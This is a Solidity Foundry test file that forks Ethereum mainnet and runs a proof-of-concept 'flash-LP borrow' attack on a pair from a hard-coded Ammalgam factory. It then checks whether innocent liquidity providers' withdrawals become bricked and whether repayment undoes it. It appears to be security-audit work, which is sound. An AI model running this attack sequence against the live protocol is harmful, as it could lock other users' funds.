// SPDX-License-Identifier: MIT
pragma solidity ^0.8.34;

import {Test, console2} from "forge-std/Test.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IAmmalgamPair {
    function mint(address to) external returns (uint256);
    function burn(address to) external returns (uint256, uint256);
    function deposit(address to) external;
    function borrow(address to, uint256 amountXAssets, uint256 amountYAssets, bytes calldata data) external;
    function repay(address onBehalfOf) external returns (uint256, uint256);
    function sync() external;
    function tokens(uint256 tokenType) external view returns (address);
    function getReserves() external view returns (uint112, uint112, uint32);
    function underlyingTokens() external view returns (address, address);
}

contract MockERC20 {
    string public name; string public symbol; uint8 public immutable decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    constructor(string memory n, string memory s, uint8 d) { name=n; symbol=s; decimals=d; }
    function mint(address to, uint256 amount) external { totalSupply+=amount; balanceOf[to]+=amount; }
    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender]-=amount; balanceOf[to]+=amount; return true;
    }
    function approve(address s, uint256 a) external returns (bool) { allowance[msg.sender][s]=a; return true; }
    function transferFrom(address f, address t, uint256 a) external returns (bool) {
        uint256 al=allowance[f][msg.sender];
        if (al!=type(uint256).max) allowance[f][msg.sender]=al-a;
        balanceOf[f]-=a; balanceOf[t]+=a; return true;
    }
}

/// @dev After flash-LP borrow, can innocent LPs still exit? Can attacker unbrick?
contract FlashLpBrickTest is Test {
    address constant FACTORY = 0x1a411b0fD1f368D2F413A8cBb6aAD425c923015B;

    IAmmalgamPair pair;
    MockERC20 assetX;
    MockERC20 assetY;
    uint256 seedLp;

    function setUp() public {
        vm.createSelectFork(vm.envOr("ETH_RPC_URL", string("https://mainnet.gateway.tenderly.co")));
        MockERC20 a = new MockERC20("A","A",18);
        MockERC20 b = new MockERC20("B","B",18);
        address p = IFactory(FACTORY).createPair(address(a), address(b));
        pair = IAmmalgamPair(p);
        (address px, address py) = pair.underlyingTokens();
        assetX = MockERC20(px); assetY = MockERC20(py);

        uint256 seed = 1e24;
        assetX.mint(address(this), seed * 100);
        assetY.mint(address(this), seed * 100);
        assetX.transfer(p, seed);
        assetY.transfer(p, seed);
        seedLp = pair.mint(address(this));
        console2.log("seedLp", seedLp);
    }

    function _attack(uint256 flashMult, uint256 borrowBps, uint256 collMultBps)
        internal
        returns (address atk, address hlp, uint256 flashLp, uint256 borrowAmt)
    {
        (uint112 rx, uint112 ry,) = pair.getReserves();
        borrowAmt = uint256(rx) * borrowBps / 10_000;
        uint256 collAmt = (uint256(ry) * borrowAmt / uint256(rx)) * collMultBps / 10_000;
        uint256 flashX = uint256(rx) * flashMult;
        uint256 flashY = uint256(ry) * flashMult;

        atk = makeAddr(string(abi.encodePacked("atk", flashMult)));
        hlp = makeAddr(string(abi.encodePacked("hlp", flashMult)));
        // unique addresses per call
        atk = address(uint160(uint256(keccak256(abi.encode(flashMult, borrowBps, "atk")))));
        hlp = address(uint160(uint256(keccak256(abi.encode(flashMult, borrowBps, "hlp")))));
        vm.deal(atk, 0); // ensure exist

        assetY.mint(atk, collAmt);
        assetX.mint(hlp, flashX);
        assetY.mint(hlp, flashY);

        vm.startPrank(atk);
        assetY.transfer(address(pair), collAmt);
        pair.deposit(atk);
        vm.stopPrank();

        vm.startPrank(hlp);
        assetX.transfer(address(pair), flashX);
        assetY.transfer(address(pair), flashY);
        flashLp = pair.mint(hlp);
        vm.stopPrank();

        vm.prank(atk);
        pair.borrow(atk, borrowAmt, 0, "");
    }

    function test_innocentLpBurn_afterAttack() public {
        _attack(5, 7000, 50_000); // 5x flash, 70% borrow, 5x coll

        // Innocent seed LP tries to exit a SMALL slice
        uint256 slice = seedLp / 100;
        IERC20 lpToken = IERC20(pair.tokens(0));
        lpToken.transfer(address(pair), slice);
        try pair.burn(address(this)) returns (uint256 ox, uint256 oy) {
            console2.log("INNOCENT BURN OK", ox, oy);
        } catch (bytes memory r) {
            console2.log("INNOCENT BURN BRICKED");
            console2.logBytes(r);
        }
    }

    function test_innocentLpBurn_largeSlice_afterAttack() public {
        _attack(5, 7000, 50_000);
        IERC20 lpToken = IERC20(pair.tokens(0));
        // try burn half of seed
        uint256 slice = seedLp / 2;
        console2.log("attempting burn slice", slice);
        try this.helperBurn(slice) {
            console2.log("HALF SEED BURN OK");
        } catch (bytes memory r) {
            console2.log("HALF SEED BURN BRICKED");
            console2.logBytes(r);
        }
    }

    function helperBurn(uint256 slice) external {
        IERC20(pair.tokens(0)).transfer(address(pair), slice);
        pair.burn(address(this));
    }

    function test_unbrick_by_fullRepay_then_burnFlash() public {
        (address atk, address hlp, uint256 flashLp, uint256 borrowAmt) = _attack(5, 7000, 50_000);

        // Fully repay
        assetX.mint(atk, borrowAmt * 2); // cover fee
        vm.startPrank(atk);
        assetX.transfer(address(pair), borrowAmt * 2);
        pair.repay(atk);
        vm.stopPrank();
        console2.log("repaid; debt left", IERC20(pair.tokens(4)).balanceOf(atk));

        // Now burn flash
        vm.startPrank(hlp);
        IERC20(pair.tokens(0)).transfer(address(pair), flashLp);
        try pair.burn(hlp) returns (uint256 ox, uint256 oy) {
            console2.log("FLASH BURN AFTER REPAY OK", ox, oy);
        } catch (bytes memory r) {
            console2.log("FLASH BURN AFTER REPAY STILL BRICKED");
            console2.logBytes(r);
        }
        vm.stopPrank();

        // Innocent burn
        try this.helperBurn(seedLp / 10) {
            console2.log("INNOCENT BURN AFTER REPAY OK");
        } catch (bytes memory r) {
            console2.log("INNOCENT STILL BRICKED");
            console2.logBytes(r);
        }
    }

    function test_transferFlashLp_toEoa_works() public {
        (, address hlp, uint256 flashLp,) = _attack(5, 7000, 50_000);
        address other = makeAddr("other");
        vm.prank(hlp);
        try IERC20(pair.tokens(0)).transfer(other, flashLp) {
            console2.log("transfer to EOA OK", IERC20(pair.tokens(0)).balanceOf(other));
        } catch (bytes memory r) {
            console2.log("transfer to EOA failed");
            console2.logBytes(r);
        }
    }
}
